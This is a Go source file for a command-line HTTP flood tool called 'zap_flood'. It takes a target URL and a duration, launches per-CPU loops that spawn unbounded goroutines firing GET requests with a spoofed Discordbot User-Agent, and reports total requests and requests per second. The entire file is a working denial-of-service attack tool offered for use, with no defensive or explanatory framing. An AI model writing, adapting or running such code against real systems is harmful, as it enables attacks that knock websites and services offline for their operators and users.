package main

import (
	"fmt"
	"net/http"
	"os"
	"sync/atomic"
	"time"
	"runtime"
	"strconv"
)

var counter uint64

func flood(target string, duration int) {
	client := &http.Client{
		Transport: &http.Transport{
			MaxIdleConnsPerHost: 10000,
		},
		Timeout: time.Second * 5,
	}

	end := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(end) {
		go func() {
			req, _ := http.NewRequest("GET", target, nil)
			req.Header.Set("User-Agent", "Discordbot/2.0 (+https://discordapp.com)")
			resp, err := client.Do(req)
			if err == nil {
				resp.Body.Close()
			}
			atomic.AddUint64(&counter, 1)
		}()
	}
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: zap_flood <url> <duration_in_seconds>")
		return
	}

	// Get the target URL and duration from the command-line arguments
	target := os.Args[1]

	// Parse the duration input
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid duration. Please provide a valid number for duration.")
		return
	}

	// Display the message about the flood
	fmt.Printf("Launching HTTP flood on %s for %d seconds using %d threads\n", target, duration, runtime.NumCPU())

	// Start the flood with the given duration and target
	for i := 0; i < runtime.NumCPU(); i++ {
		go flood(target, duration)
	}

	ticker := time.NewTicker(5 * time.Second)
	done := time.After(time.Duration(duration) * time.Second)

	var lastCount uint64

loop:
	for {
		select {
		case <-ticker.C:
			now := atomic.LoadUint64(&counter)
			rps := now - lastCount
			lastCount = now
			fmt.Printf("[ZAP FLOOD] Total: %d | RPS: %d\n", now, rps)
		case <-done:
			break loop
		}
	}

	// End the attack
	fmt.Printf("Flooding ended. Total Requests: %d\n", counter)
}
